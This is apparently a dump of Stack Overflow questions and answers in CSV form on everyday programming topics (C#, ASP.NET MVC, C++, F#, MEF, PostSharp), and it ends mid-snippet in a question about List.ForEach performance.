"<p>Ok, I've read a couple books on XML and wrote programs to spit it out and what not.  But here's the question.  Both a comma delimited file and a XML file are ""human readable.""  But in general, the comma delimited file is much easier on my eyes than a XML file; the tags typically take up as much if not more space than the data.  This just seems to obscure what I'm reading and the format can take a page to contain the same information that you can contain on a single line of text in a comma delimited file.  And a comma delimited file is significantly less complex to parse.  So the real question is why XML?  Just because all the cool kids are doing it?</p>
","33708","","<p>XML supports complex, structured and hierarchical representation of things. That's far from what CSV can store trivially.</p>

<p>Think about a complex object graph in an object oriented environment. It can be serialized as an XML document pretty easily but CSV cannot handle such a thing.</p>
"
"<p>I have 2 assemblies: </p>

<p>Assembly 1: </p>

<pre><code>interface IWeapon {
    int Might { get; }
}

[Export(""sword"")]
public class Sword : IWeapon {

    public int Might {
        get { return 10; }
    }
}
</code></pre>

<p>Assembly 2: </p>

<pre><code>interface IWeapon {
    int Might { get; }
}

var catalog = new AssemblyCatalog(typeof(Ninja.Sword).Assembly);
var container = new CompositionContainer(catalog);
// not allowed to use the IWeapon def in assembly 2 
var sword = container.GetExportedValue&lt;IWeapon&gt;(""sword"");
</code></pre>

<p>I know how to get this to work. I can either ask the MEF (Managed Extensibility Framework)  for the object, or get it to export the correct IWeapon instead of just the object by name. </p>

<p>Can MEF do the ""duck"" typing for me and return a proxy object if all the interface points are implemented? </p>
","33708","","<p>I think it was there in early versions of MEF (by dynamically emitting IL for the class and returning it) and it's removed now. It really doesn't make sense. After all, your class should be <em>designed</em> to implement that add-in functionality through a specific interface. If you can add things like <code>Export</code> attribute to them, you should be perfectly able to implement the interface on your class too.</p>
"
"<p>I've found some strange code...</p>

<pre><code>//in file ClassA.h:
class ClassA {
public:
    void Enable( bool enable );
};

//in file ClassA.cpp
#include &lt;ClassA.h&gt;
void ClassA::Enable( bool enable = true )
{
   //implementation is irrelevant
}

//in Consumer.cpp
#inclide &lt;ClassA.h&gt;
....
ClassA classA;
classA.Enable( true );
</code></pre>

<p>Obviously since Consumer.cpp only included ClassA.h and not ClassA.cpp the compiler will not be able to see that the parameter has a default value.</p>

<p>When would the declared default value of ClassA::Enable in the signature of the method implementation have any effect? Would this only happen when the method is called from within files that include the ClassA.cpp?</p>
","33708","","<p>Default values are just a compile time thing. There's no such thing as default value in compiled code (no metadata or things like that). It's basically a compiler replacement for ""if you don't write anything, I'll specify that for you."" So, if the compiler can't see the default value, <strong>it assumes there's not one</strong>.</p>

<p>Demo:</p>

<pre><code>// test.h
class Test { public: int testing(int input); };

// main.cpp
#include &lt;iostream&gt;
// removing the default value here will cause an error in the call in `main`:
class Test { public: int testing(int input = 42); };
int f();
int main() {
   Test t;
   std::cout &lt;&lt; t.testing()  // 42
             &lt;&lt; "" "" &lt;&lt; f()   // 1000
             &lt;&lt; std::endl;
   return 0;
}

// test.cpp
#include ""test.h""
int Test::testing(int input = 1000) { return input; }
int f() { Test t; return t.testing(); }
</code></pre>

<p>Test:</p>

<pre><code>g++ main.cpp test.cpp
./a.out
</code></pre>
"
"<p>From the <a href=""http://www.wowhead.com/?tos"" rel=""nofollow"">Wowhead Terms of Service</a>:</p>

<blockquote>
  <p>""Intellectual Property Rights
  The Service and any necessary software used in connection with the Service (""Software"") contain proprietary and confidential information that is protected by applicable intellectual property and other laws. You agree not to modify, rent, lease, loan, sell, distribute or create derivative works based on the Service or the Software, in whole or in part.""</p>
</blockquote>

<p>Does this mean that I can't write a program to consume a web service being published by the writers of this TOS?  </p>

<p>I find it kind of scary that I even have to ask this question.  The wikipedia article on ""derivative works"" isn't very conclusive.</p>
","33708","","<p>If the communication protocol is standard (e.g. HTTP, SOAP), I don't think it's considered derivative work of the Web server software. It relies on standard protocols and would work with <em>any</em> implementation of the same API over those standards.</p>

<p><em>Disclaimer: I'm not a laywer.</em></p>
"
"<p>I have written a basic Application for windows mobile 5.</p>

<p>It is using visual studio 2008 and c#  .net</p>

<p>I am currently trying to find a way of storing my customer names but im not sure what format is best for storing data directly on the device ( i dont need it to integrate with any servers or anything)</p>

<p>I'm hoping someone here knows which direction i should be looking. I'm looking into the dataset object at the moment but doesnt seem to be saving anything?</p>

<p>Here is a snippet of code i've been playing with.</p>

<pre><code>        private void menuItem1_Click(object sender, EventArgs e)
    {
        DataSet mySet = new DataSet1();
        DataRow oOrderRow = mySet.Tables[""tblPeople""].NewRow();
        oOrderRow[""name""] =nameTextBox.Text;
        mySet.Tables[""tblPeople""].Rows.Add(oOrderRow);

    }
</code></pre>
","33708","","<p>Try <a href=""http://www.microsoft.com/sqlserver/2008/en/us/compact.aspx"">SQL Server Compact edition</a>. </p>

<p>It's very similar to the ""real"" SQL Server from client perspective. It supports easy data access with LINQ.</p>
"
"<p>I have some </p>

<pre><code>std::list&lt;char&gt; list_type
</code></pre>

<p>Now I have to supply contents of the list as (char *data, int length). Is there convenient way to present list contents as pointer and length? Does <code>&lt;vector&gt;</code> has such interface?</p>

<p>Thank you in advance. </p>
","33708","","<p><code>list</code> is a linked list data structure. There's no way you could do that (theoretically) without conversion.</p>

<p>You'll be able to access (<a href=""http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2008/n2738.pdf"" rel=""nofollow"">C++0x Draft 23.2.6.3</a>) the backing store of a <code>vector</code> with <code>.data()</code> in C++0x. Currently, your best bet is to treat it as an array by taking the address of the initial element.</p>
"
"<p>Consider this code:</p>

<pre><code>public &lt;T&gt; List&lt;T&gt; meth(List&lt;?&gt; type)
{
   System.out.println(type); // 1
   return new ArrayList&lt;String&gt;(); // 2
}
</code></pre>

<p>It does not compile at line 2, saying that List is required.</p>

<p>Now, if it's changed to:</p>

<pre><code>public &lt;T&gt; List&lt;?&gt; meth(List&lt;T&gt; type)
{
   System.out.println(type); // 1
   return new ArrayList&lt;String&gt;(); // 2
}
</code></pre>

<p>It does compile. Why? I thought the difference between declaring a generic type with T and using the  wildcard was that, when using the wildcard, one cannot add new elements to a collection. Why would <code>&lt;?&gt;</code> allow a subtype of List to be returned? I'm missing something here, what's the explicit rule and how it's being applied?</p>
","33708","","<p>In the first case, <code>T</code> is not necessarily a superclass of <code>String</code>. If you choose a <code>T</code> like <code>Integer</code> and call the method, it'll fail; so it won't compile. However, the second will compile as surely, any <code>ArrayList&lt;String&gt;</code> is a valid <code>List</code> of <em>something</em>.</p>
"
"<p>Working with stl:list and stl::vector types under interrupt handlers I want to avoid malloc() calls.</p>

<p>The question: What is a best way to prevent malloc() calls in STL list and vector? Is it enough to create structure with predefined size and then avoid push/pop/erase calls?</p>

<p>Thank you in advance</p>
","33708","","<p>For <code>std::vector</code> that should be sufficient. I don't think anything guarantees that though. Memory allocation is considered an implementation detail. If you can restrict yourself to a specific size, I suggest going with a simple static array instead. That way, you have a fine-grained control over what exactly happens.</p>
"
"<p>When using the Html helpers for ASP.NET MVC I need to wrap them in a Response.Write else they don't appear. However the samples (<a href=""http://msdn.microsoft.com/en-us/library/dd410596.aspx"" rel=""nofollow"">1</a>&amp;<a href=""http://www.codeproject.com/KB/aspnet/asp%5Fnet%5Fmvc%5Fimagelink.aspx"" rel=""nofollow"">2</a> for example) I find online for ASP.NET MVC don't seem to do that. Did something change somewhere or am I doing something wrong?</p>

<p>From the samples I find it should be like this:  </p>

<pre><code>&lt;div class=""row""&gt;
  &lt;% Html.ActionLink(""View"", ""Details"", ""People""); %&gt;
&lt;/div&gt;
</code></pre>

<p>However that displays nothing, so I need to wrap it in a Response.Write as follows:</p>

<pre><code>&lt;div class=""row""&gt;
  &lt;% Response.Write(Html.ActionLink(""View"", ""Details"", ""People"")); %&gt;
&lt;/div&gt;
</code></pre>
","33708","","<p><code>Html.ActionLink</code> does not write anything to the response stream. It just returns a <code>string</code>. To output that in the response you need to use <code>Response.Write</code>:</p>

<pre><code>&lt;% Response.Write(Html.ActionLink(""View"", ""Details"", ""People"")); %&gt;
</code></pre>

<p>or alternatively, there's a shorthand for <code>Response.Write</code>:</p>

<pre><code>&lt;%= Html.ActionLink(""View"", ""Details"", ""People"") %&gt;
</code></pre>

<p>Note that the latter syntax requires an <em>expression</em> rather than a statement, thus it shouldn't have semicolon.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/17532/asp-net-custom-controls-composites"">ASP.NET Custom Controls - Composites</a>  </p>
</blockquote>



<p>How to make and use composite control in asp.net?</p>
","33708","","<p>A composite control is a control that's <em>composed</em> of some child controls (which are added by overriding <code>CreateChildControls</code> method). For a detailed article on them see <a href=""http://msdn.microsoft.com/en-us/library/aa479016.aspx"" rel=""nofollow"">MSDN: A Crash Course on ASP.NET Control Development: Building Composite Controls</a></p>
"
"<p>Suppose we want to loop through all the items in a dropdown list and no item is added or removed while we are looping. The code for it is as follows:</p>

<pre><code>for (int i = 0; i &lt; ddl.Items.Count; i++)
{
    if (ddl.Items[i].Text == text)
    {
        found = true;
        break;
    }
}
</code></pre>

<p>If it is changed to this:</p>

<pre><code>for (int i = 0, c = ddl.Items.Count; i &lt; c; i++)
{
    if (ddl.Items[i].Text == text)
    {
        found = true;
        break;
    }
}
</code></pre>

<p>Is there any performance gain? Does the compiler do something <em>clever</em> not to read the <code>Count</code> property every iteration?</p>
","33708","","<p>I suggest another optimization. Cache the value of <code>Items</code> property. If <code>Items</code> property itself is performance intensive (as some WinForms properties are, contrary to how they look), it can be very inefficient to loop. For instance, see:  <a href=""http://stackoverflow.com/questions/1136825/why-foreach-is-faster-than-for-loop-while-reading-richtextbox-lines/1136830#1136830"">why foreach is faster than for loop while reading richtextbox lines</a>. </p>

<p>Also, if you don't need the index, why don't you use <code>foreach</code>. It's easier to read and less prone to errors.</p>
"
"<p>For the last year or so I have followed the idea that if a method could be static, to make it static, as this can have a performance benefit, and I have therefore ended up with some static classes in my applications.</p>

<p>I have since learned the performance benefit is not often large enough to be worthwhile, and also the distinction that methods that can be made static, perhaps shouldn't be from a design point of view, if they are more specific to the object, rather than the type - <a href=""http://stackoverflow.com/questions/731763/should-c-methods-that-can-be-static-be-static"">related question</a></p>

<p>As an example I have recently made a FileRepository class, that implements the repository pattern for our own File class (for example import files). This class is not static, and a repository object must first be created before it can be accessed.</p>

<p>My issue with this, is all my old static calls, are now 2 lines (unless I can re-use the object in local scope). The repository object (as yet) has no state, as it uses database access via a thread static variable.</p>

<p>My question is, what are people's opinions on having a thread static Current property on the class, where the get accessor initialises the object on the first call? As I understand it, this would still avoid the pitfalls of static classes, such as not being able to implement generic functionality via interfaces, but still offer the ease of single line calls to the repository object?</p>

<p>Just trying to adjust my practices and mindset for the better.</p>
","33708","","<p>One benefit of <strong>not</strong> using static stuff and always hold direct references to dependencies is the ability to mock and unit test objects easily. You'll lose this ability if you directly reference your static class or current property.</p>
"
"<p>In this C# code snippet, <code>DateTime.Now.Month.ToString()</code> returns <code>7</code> as output. </p>

<p>I would like to get <code>07</code> as a return value.</p>

<p>What can I do to add the leading zero when the month has only 1 digit?</p>
","33708","","<pre><code>DateTime.Now.Month.ToString(""d2"")
</code></pre>
"
"<p>Not that I would want to use this practically (for many reasons) but out of strict curiousity I would like to know if there is a way to reverse order a string using LINQ and/or LAMBDA expressions in <strong>one line of code</strong>, without utilising any framework ""Reverse"" methods.</p>

<p>e.g.</p>

<pre><code>string value = ""reverse me"";
string reversedValue = (....);
</code></pre>

<p>and reversedValue will result in ""em esrever""</p>

<p><strong>EDIT</strong>
Clearly an impractical problem/solution I know this, so don't worry it's strictly a curiosity question around the LINQ/LAMBDA construct.</p>
","33708","","<p>I don't see a practical use for this but just for the sake of fun:</p>

<pre><code>new string(Enumerable.Range(1, input.Length).Select(i =&gt; input[input.Length - i]).ToArray())
</code></pre>
"
"<p>I just converted a code snippet from VB.NET to C# and stumbled over this issue.</p>

<p>Consider this code:</p>

<pre><code>    Dim x As Integer = 5
    Dim y As Object = x
    Dim z As Decimal = CType(y, Decimal)
</code></pre>

<p>No error from compiler or at runtime. z is five.  </p>

<p>Now let's translate this code to C#</p>

<pre><code>    int x = 5;
    object y = x;
    decimal z = (decimal)y;
</code></pre>

<p>No error from compiler but at runtime an exception is thrown:</p>

<pre><code>    Cannot unbox ""y"" to ""decimal""
</code></pre>

<p>Now my question is, which would be the smartest C# way to do this.</p>

<p>Currently my code looks like.</p>

<pre><code>    int x = 5;
    object y = x;
    decimal z = decimal.Parse(y.ToString());
</code></pre>

<p>But another solution would be:</p>

<pre><code>    decimal z = (decimal)(int)y;
</code></pre>

<p>Which looks a bit confusing, but propably has less overhead than decimal.Parse, I guess.</p>
","33708","","<p><code>(decimal)(int)x</code> is the right way of doing so if you expect the boxed object to be an integer. Converting to string and parsing is not a good way to attack the problem and incurs some overhead.</p>

<p>If you just know the object can be converted to <code>decimal</code> in some way, try <code>System.Convert.ToDecimal</code> method. It'll handle that for you.</p>
"
"<p>i am making a website using asp.net and C# and well i got stuck at the first hurdle, i found out that to use code you use the &lt;% %> with asp but i dont get how i would create an object of my class to use in the aspx file?</p>

<p>I think its syntax more than anything i cant seem to get to work.</p>

<p>Thanks, </p>

<p>Ash</p>
","33708","","<p>If you need to declare a global object to be accessible everywhere in your page:</p>

<pre><code>&lt;script runat=""server""&gt;
   // ObjectType: Your class name
   // Name: Your instance (variable) name.
   ObjectType Name = new ObjectType();
&lt;/script&gt;
</code></pre>

<p>If you just need a local variable:</p>

<pre><code>&lt;%
   ObjectType name = new ObjectType();
   name.SomeMethod();
%&gt;
</code></pre>

<p>By the way, you should have good reasons for using these kind of things in ASP.NET. There are usually better ways to encapsulate user interface elements in user controls and master pages.</p>

<p>Side note: You can't use <code>using</code> directives in <code>.aspx</code> files. If you need to import some namespace in your code, you should add <code>&lt;%@ Imports Namespace=""SomeNamespace"" %&gt;</code> directives right after your <code>&lt;%@ Page %&gt;</code> directive.</p>
"
"<p>I want to do something like this:</p>

<ol>
<li>Create a number of assemblies that implement IMyInterface.</li>
<li>In the web.config or app.config of my application, define which one of them to load (they may have different names)</li>
<li>When the application starts, load the assembly as marked in web.config and use its implementation of IMyInterface</li>
</ol>

<p>what is the best way of doing this?
I am using Framework 3.5 at this time.</p>

<p>(p.s. I know I can just define a variable that contains the assembly name (e.g. key=""My assembly"", value=""myassembly.dll"" then dynamically load the assembly, just wanting to know if there is a more correct way of doing this)</p>
","33708","","<p>Assemblies do not implement interfaces; types do. </p>

<p>For ASP.NET apps, I suggest putting every assembly in the <code>/bin</code> directory and use a <code>web.config</code> configuration option and <code>Activator.CreateInstance</code> to create the actual type:</p>

<pre><code>var typeName = ""MyNamespace.MyClass, MyAssembly""; // load from config file
IMyInterface instance = 
              (IMyInterface)Activator.CreateInstance(Type.GetType(typeName));
</code></pre>
"
"<p>I have an abstract class in a library. I'm trying to make it as easy as possible to properly implement a derivation of this class. The trouble is that I need to initialize the object in a three-step process: grab a file, do a few intermediate steps, and then work with the file. The first and last step are particular to the derived class. Here's a stripped-down example.</p>

<pre><code>abstract class Base
{
    // grabs a resource file specified by the implementing class
    protected abstract void InitilaizationStep1();

    // performs some simple-but-subtle boilerplate stuff
    private void InitilaizationStep2() { return; }

    // works with the resource file
    protected abstract void InitilaizationStep3();

    protected Base()
    {
        InitilaizationStep1();
        InitilaizationStep2();
        InitilaizationStep3();
    }
}
</code></pre>

<p>The trouble, of course, is the virtual method call in the constructor. I'm afraid that the consumer of the library will find themselves constrained when using the class if they can't count on the derived class being fully initialized.</p>

<p>I could pull the logic out of the constructor into a protected <code>Initialize()</code> method, but then the implementer might call <code>Step1()</code> and <code>Step3()</code> directly instead of calling <code>Initialize()</code>. The crux of the issue is that there would be no obvious error if <code>Step2()</code> is skipped; just terrible performance in certain situations.</p>

<p>I feel like either way there is a serious and non-obvious ""gotcha"" that future users of the library will have to work around. Is there some other design I should be using to achieve this kind of initialization?</p>

<p>I can provide more details if necessary; I was just trying to provide the simplest example that expressed the problem.</p>
","33708","","<p>In lots of cases, initialization stuff involves assigning some properties. It's possible to make those properties themselves <code>abstract</code> and have derived class override them and return some value instead of passing the value to the base constructor to set. Of course, whether this idea is applicable depends on the nature of your specific class. Anyway, having that much code in the constructor is smelly.</p>
"
"<p><a href=""http://dev.mysql.com/doc/refman/5.0/en/numeric-types.html"" rel=""nofollow"">Funny thing</a> I've found abount mysql. MySQL has a 3 byte numeric type - MEDIUMINT. Its range is from -8388608 to 8388607. It seems strange to me. Size of numeric types choosen for better performance, I thought data should be aligned to a machine word or double word. And if we need some restriction rules for numeric ranges, it must be external relative to datatype. For example:</p>

<pre><code>CREATE TABLE ... (
  id INT RANGE(0, 500) PRIMARY KEY
)
</code></pre>

<p>So, does anyone know why 3 bytes? Is there any reason?</p>
","33708","","<p>The alignment issue you mentioned applies mostly to data in RAM. Nothing forces MySQL to use 3 bytes to store that type as it processes it. </p>

<p>This might have a small advantage in using disk cache more efficiently though.</p>
"
"<p>I have some questions about some things in Asp.net MVC that still confuses me.</p>

<p>a. I am still confused when I should be using <code>&lt;%= %&gt;</code> and when I should use this &lt;% %>(this one seems to need a semi colon at the end).</p>

<p>b. How can I fix this in VS2008? When I make a partial view and I start typing say <code>&lt;%=</code> intellisense assumes I meant this <code>&lt;%@ Assembly= %&gt;</code> and inserts that in.</p>

<p>It really gets annoying to type in a partial view file.</p>

<p>c. I don't get the difference between <code>ActionResult, ViewResult</code> and <code>PartialViewResult</code>. <code>ActionResult</code> seems to be able to return all of these types of results. So why use the other ones?</p>

<p>d. I remembered another one: I know when doing webforms many ppl like to to hook up the site with IIS since the server controls and stuff can be rendered different using the built in Visual Studio thing(Cassi?).</p>

<p>That way when you upload your site to a server hosting site you don't have has many issues. Is this recommend with Asp.net MVC too?</p>

<p>Thanks</p>
","33708","","<p><code>&lt;% %&gt;</code> declares a code block. What you can do in a code block is similar to a body of a function. You can have several statements and in C#, every one of them should be terminated by a semicolon. <code>&lt;%= expression %&gt;</code> is equivalent to <code>&lt;% Response.Write(expression); %&gt;</code> so it's invalid to put a semicolon there.</p>

<p>I don't think there's an easy workaround for the IntelliSense problem. </p>

<p>Yes, in fact, <code>ActionResult</code> is the base class for other type of results ASP.NET MVC. If your action method return type is <code>ActionResult</code>, you can return any type of result from it. ASP.NET MVC uses the returned object to see how it should generate the response.</p>
"
"<p>Is there ability to read file that is used by another process?</p>

<p>Thanks.</p>
","33708","","<p>If the process holds an exclusive lock on the file then no. If the process holds a shared lock, you can read it.</p>
"
"<p>given two sequences, how to get all the elements belonging to both the sequences or all the elements unique to one of them?</p>

<p>Example:</p>

<pre><code>let a = [1..10]
let b = [3; 5; 7]
</code></pre>

<p>How do I compute 3 5 and 7 (all the elements <em>common</em> to both the list) and 1, 2, 4, 6, 8, 9, 10 (all the elements <em>not in common</em>)</p>

<p>Thanks</p>
","33708","","<p>Not very F#-y way I know of. You can always resort to .NET libraries. <code>seq&lt;T&gt;</code> is just <code>IEnumerable&lt;T&gt;</code>, nothing special:</p>

<pre><code>let diff = System.Linq.Enumerable.Except(seq1, seq2); // seq1 - seq2
let intersect = System.Linq.Enumerable.Intersect(seq1, seq2);
let symdiff = System.Linq.Enumerable.Union(System.Linq.Enumerable.Except(seq1, seq2), System.Linq.Enumerable.Except(seq2, seq1));
</code></pre>
"
"<p>I'm building an application that roughly follows the repository pattern with a service layer on top, similar to early versions of Conery's MVC Storefront.</p>

<p>I need to implement a page that returns all users except for the current user. I already have GetUsers() methods on the repository and service layers, so the question is where to apply the ""except for the current user.""</p>

<p>Should the service layer be aware of HttpContext, thus applying this rule?  I am tempted to just pass in the current user (id) from the controller to this service method, but it seems cleaner if the service layer was HttpContext-aware and could do this on its own. </p>

<p>One obvious alternative is to apply this rule directly within the Controller, but I'm just not hot on that idea...</p>

<p><hr /></p>

<p>Edit - just to comment on the answers:  I see the issues with the reverse dependency problem, something I was completely overlooking. I'm marking Mehrdad's as the answer due votes, but everyone has really provided a valuable response worth reading!</p>
","33708","","<p>Absolutely not. My mindset in designing these kind of things is like this: I assume I need to write a Windows based app along with the Web application and try to minimize dependency on Web specific stuff. Passing <code>HttpContext</code> directly will increase coupling of your service layer to your Web UI layer which is not ideal.</p>
"
"<p>This throws error:</p>

<pre><code>public static void RenderPartialForEach&lt;T&gt;
(this HtmlHelper helper, string partialName, IList&lt;T&gt; list)
{
    foreach (var item in list)
       helper.RenderPartial(partialName, item);
}
</code></pre>

<p>=></p>

<blockquote>
  <p>Error Message: CS1519: Invalid token '(' in class, struct, or interface member declaration</p>
  
  <p>Line 283:            #line default<br />
  Line 284:            #line hidden<br />
  Line 285:            @__w.Write(""\r\n    \r\n\r\n\r\n"");<br />
  Line 286:        }<br />
  Line 287:        </p>
</blockquote>

<p>Is it possible to create clean htmlhelper<br />
which is able to render partial views for every item in list passing it as model?</p>

<p><strong>Edit:</strong><br />
That was just a blunder from my side. I forgot to add '&lt;% } %>'.<br />
And got confused cause of error message. ^^</p>
","33708","","<p>Where are you declaring such a thing? Try writing that extension method in a separate static class in a code file, not inline in <code>.aspx</code>.</p>
"
"<p>I've created a simple Attribute:</p>

<pre><code>[AttributeUsage(AttributeTargets.Method)]
public class InitAttribute : System.Attribute
{
    public InitAttribute()
    {
        Console.WriteLine(""Works!"");
    }
}
</code></pre>

<p>and I apply it to a simple method:</p>

<pre><code>static class Logger
{
    public static string _severity;

    public static void Init(string severity)
    {
        _severity = severity;
    }

    [Init()]
    public static void p()
    {
        Console.WriteLine(_severity);
    }
}
</code></pre>

<p>What is going on is pretty streight-forward. Only, I expect the attribute to perform an action (printing Works!), but this does not happen.</p>

<p>Addictionally, printing ""Works!"" is of course just for debugging purposes: I'd like to access the <em>instance</em>'s property <code>_severity</code> (to check if is != null, for example), but everything I keep reading about attributes (that are pretty new to me) is about accessing the <em>class</em>' methods or properties and so on via reflection. Once I've evaluated <code>_severity</code>, how can I modify the behavior of the decorated method (in this case, rise an exception ""Logger is not initialized"" and do not execute it)?</p>

<p>Any help appreciated.</p>
","33708","","<p>If you need to perform an action as control enters a method, you should look at <a href=""http://en.wikipedia.org/wiki/Aspect-oriented%5Fprogramming"">aspect-oriented programming</a> and frameworks such as <a href=""http://www.postsharp.org/"">PostSharp</a>. Attributes are not designed to perform anything by themselves. They are just a bunch of data (or metadata if you will) attached to stuff in IL assemblies that can be queried at runtime.</p>
"
"<p>This may be a silly question (with MSDN and all), but maybe some of you will be able to help me sift through amazing amounts of information. </p>

<p>I need to know the specifics of the implementations of common data structures and algorithms in C#. That is, for example, I need to know, say, how Linked Lists are handled and represented, how they and their methods are defined.</p>

<p>Is there a good centralized source of documentation for this (with code), or should I just reconstruct it? Have you ever had to know the specifics of these things to decide what to use?</p>

<p>Regards, and thanks.</p>
","33708","","<p>Scott Mitchell has a great 6-part article that covers many .NET data structures:</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/aa287104%28VS.71%29.aspx"">An Extensive Examination of Data Structures</a></p>

<p>For an algorithmic overview of data structures, I suggest reading <em>the</em> algorithm textbook: ""Introduction to Algorithms"" by Cormen, et al..</p>

<p>For details on each .NET data structure the MSDN page on that specific class is good.</p>

<p>When all of them fail to address issues, <a href=""http://www.red-gate.com/products/reflector/"">Reflector</a> is always there. You can use it to dig through the actual source and see things for yourself.</p>
"
"<p>Following the advice got on <a href=""http://stackoverflow.com/questions/1164978/c-attribute-actions-and-instance-values"">another question of mine</a>, I converted the code there quoted to be used with PostSharp:</p>

<p>Attribute:</p>

<pre><code>[Serializable]
public sealed class InitAttribute : OnMethodBoundaryAspect
{
    public override void OnEntry(MethodExecutionEventArgs eventArgs)
    {
        Console.Write(""Works!"");
    }
}


static class Logger
{
    public static string _severity;

    public static void Init(string severity)
    {
        _severity = severity;
    }

    [Init()]
    public static void p()
    {
        Console.WriteLine(_severity);
    }
}
</code></pre>

<p>Still, I cannot get any result (""Works!"" on the console). A breakpoint within the PostSharp attribute reveals that it is never entered.</p>

<p>Any Help? Thanks in advance.</p>
","33708","","<p>PostSharp processes the compiled IL binary and adds action you want to the method <strong>body</strong> decorated with the attribute. The attribute won't do anything by itself. This is how CLR tends to work. It just treats attributes as <em>data</em>, not executable code. Without <a href=""http://doc.postsharp.org/1.5/UserGuide/Platform/CommandLine.html"">running PostSharp on the compiled code</a>, you don't get anything special.</p>
"
"<p>Is there a library of generic collection algorithms for .NET? I would like to be able to write something like this:</p>

<pre><code>IList&lt;T&gt; items = GetItemsFromSomeWhere();
Algorithms&lt;T&gt;.Sort(items);
//
// bla bla bla
//
T item = GetItemSomwHow();
int i = Algorithms&lt;T&gt;.IndexOf(items, item);
</code></pre>

<p>Note, that <code>items</code> is not <code>List&lt;T&gt;</code>, otherwise I could simply use the <code>List&lt;T&gt;.Sort</code> and <code>List&lt;T&gt;.BinarySearch</code> methods.</p>

<p>Of course, I can implement them myself, I just do not want to invent a wheel.</p>

<p>Ah, and another thing. I would like the implementation to be efficient.</p>

<p>Thanks.</p>

<p>P.S.</p>

<p>Please, do not advise on which collections to use. I am perfectly aware of the <code>Array</code> or <code>List&lt;T&gt;</code> abilities. What I need is a library of algorithms to work on any <code>IList&lt;T&gt;</code> based collection.</p>

<p><strong>EDIT:</strong>
Found what I needed - see my own answer.</p>
","33708","","<p><a href=""http://msdn.microsoft.com/en-us/library/system.linq.enumerable%5Fmembers.aspx"" rel=""nofollow""><code>System.Linq.Enumerable</code> class</a> does a bunch of good stuff. Admittedly, it does miss some stuff but it's applicable nevertheless.</p>
"
"<p>For my new Pet-Project I have a question for design, that is decided already, but I want some other opinions on that too.</p>

<p>I have two classes (simplified):</p>

<pre><code>class MyObject
{
  string name {get;set;}
  enum relation {get;set;}
  int value {get;set;}
}

class MyObjectGroup
{
  string name {get;set;}
  enum relation {get;set;}
  int value {get;set;}
  List&lt;MyObject&gt; myobjects {get;set;}
}
</code></pre>

<p>Later in the Project <code>MyObjectGroup</code> and <code>MyObject</code> should be used equally. For this I could go two ways:</p>

<ul>
<li>Create an interface: <code>IObject</code></li>
<li>Create an abstract class: <code>ObjectBase</code></li>
</ul>

<p>I decided to go the way of the interface, that I later in code must not write <code>ObjectBase</code> every time but <code>IObject</code> just for ease - but what are other positives for this way?</p>

<p>And second, what about adding <code>IXmlSerializable</code> to the whole story?
Let the interface inherit from <code>IXmlSerializable</code> or does it have more positives to implement <code>IXmlSerializable</code> in abstract base class?</p>
","33708","","<p>Generally, you should consider interfaces as <em>contracts</em> that some types implement and abstract classes as <em>nodes in inheritance hierarchy</em> that don't exist by themselves (i.e. there is an <em>""is a""</em> relationship between the derived class and the base abstract class). However, in practice, you might need to use interfaces in other cases, like when you need multiple inheritance.</p>

<p>For instance, <code>IXmlSerializable</code> is not an ""entity"" by itself. It defines a contract that an entity can implement. Interfaces live ""outside"" the inheritance hierarchy.</p>
"
"<p>I have a class with a property which is an enum</p>

<p>The enum is</p>

<pre><code>/// &lt;summary&gt;
/// All available delivery actions
/// &lt;/summary&gt;
public enum EnumDeliveryAction
  {
    /// &lt;summary&gt;
    /// Tasks with email delivery action will be emailed
    /// &lt;/summary&gt;
    Email,

    /// &lt;summary&gt;
    /// Tasks with SharePoint delivery action 
   /// &lt;/summary&gt;
   SharePoint
  }
</code></pre>

<p>When I create an instance of this class, NOWHERE in the code, do I specify the value of the enum field, but it seems to default to the first item in the enumlist, and not a null value, is this how enums work? How is it possible to ensure that the enum gets some kind of null value if it is not set, I don't want it defaulting to the first value in the enum.</p>
","33708","","<p>Default value for <code>enum</code> types is <code>0</code> (which is by default, the first element in the enumeration). Fields of a class will be initialized to the default value.</p>

<p>If you need to represent an <em>unknown</em> value in the enum, you can add an element <code>Unknown</code> with value 0. Alternatively, you could declare the field as <code>Nullable&lt;MyEnum&gt;</code> (<code>MyEnum?</code>).</p>
"
"<p>HI,</p>

<p>I'm trying to build up a number format for currency data.</p>

<p>If the symbol is $:
     the result of   $ + #,##0.0000  is $#,##0.0000
 -> it's good.</p>

<p>But if the symbol is Ø±.Ø³  (Saudi Arabia currency symbol)
     the result is    #,##000Ø±.Ø³    ~0  s0<br />
Even on this website I cannot write the correct result string.
My expected result is just place the symbol right the same like any other, but every time I try it always turn to a weird character order.</p>

<p>Do you know why?</p>
","33708","","<p>There are lots of issues in bidirectional Unicode character ordering. Try setting the text direction of the Label/TextBox/whatever you are putting the string into to right-to-left.</p>
"
"<p>The generic list class has a <code>.ForEach(Action&lt;T&gt; action)</code> method.  Now i've done some <strong>simple</strong> timings of how they both perform and it seems that the generic ForEach is the poorer performer.  The (Snippet Compiler Friendly) code is below - </p>

<pre><code>public static class timer{
    public static long foreachloop = 0;
    public static long Gforeachloop = 0;}

public class something{
    public List&lt;string&gt; myStrings = new List&lt;string&gt;();

    public something()
    {
    	for(int i = 1; i&lt;=5000000;i++)
    	{
    		myStrings.Add(i.ToString());
    	}
    }}

public class cls1{
    private static List&lt;string&gt; Strings = new List&lt;string&gt;();
    private static List&lt;string&gt; OtherStrings = new List&lt;string&gt;();

    public static void RunSnippet()
    {
    	something s = new something();

    	Stopwatch watch = new Stopwatch();
    	watch.Start();
    	foreach(string x in s.myStrings)
    	{
    		Strings.Add(x);
    	}
    	watch.Stop();
    	timer.foreachloop = watch.ElapsedMilliseconds;

    	watch.Reset();
    	watch.Start();

    	s.myStrings.ForEach(delegate(string n){OtherStrings.Add(n);});

    	s.myStrings.Clear();

    	watch.Stop();
    	timer.Gforeachloop = watch.ElapsedMilliseconds;

    	WL(""FOREACH-""+timer.foreachloop + "",Count = "" + Strings.Count);
    	WL(""GFOREACH-""+timer.Gforeachloop + "",Count = "" + OtherStrings.Count);
    }

    #region Helper methods

    public static void Main()
    {
    	try
    	{
    		RunSnippet();
    	}
    	catch (Exception e)
    	{
    		string error = string.Format(""---\nThe following error occurred while executing the snippet:\n{0}\n---"", e.ToString());
    		Console.WriteLine(error);
    	}
    	finally
    	{
    		Console.Write(""Press any key to continue..."");
    		Console.ReadKey();
